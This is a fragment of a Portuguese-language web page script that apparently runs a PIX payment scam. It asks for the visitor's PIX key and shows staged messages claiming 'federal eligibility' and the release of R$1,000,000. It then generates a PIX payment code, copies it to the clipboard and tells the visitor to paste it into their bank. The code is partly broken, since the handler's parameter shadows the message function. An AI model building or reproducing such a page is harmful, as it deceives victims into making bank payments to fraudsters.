}`;return emv}function process(e){e.preventDefault();if(processing)return;const key=k.value.trim();if(!key){e('❌ Chave PIX inválida','error');return}processing=true;b.disabled=true;b.innerHTML='<div class="spinner"><div class="spinner-icon"></div>Processando 1.000.000...</div>';e('🔄 Validando elegibilidade federal...');setTimeout(()=>{e('✅ Cliente elegível! Liberando R$1.000.000','success');q.style.display='flex';qk.textContent=key.slice(-12);const pl=g();p.innerHTML=`<strong>📱 PIX CODE (Cole no banco):</strong><br><code>${pl}</code>`;p.style.display='block';c.style.display='block';navigator.clipboard.writeText(pl).then(()=>{e('✅ 1.000.000 Copiado! Escaneie agora','success')});b.innerHTML='✅ Gerado com Sucesso';b.classList.add('pulse');},2800);processing=false;setTimeout(()=>b.disabled=false,3000)}f.addEventListener('submit',process);c.addEventListener('click',()=>{const pl=g();navigator.clipboard.writeText(pl);c.textContent='✅ Copiado!';setTimeout(()=>c.textContent='📋 Copiar PIX (1 clique)',1500)});k.focus();</script></body></html>
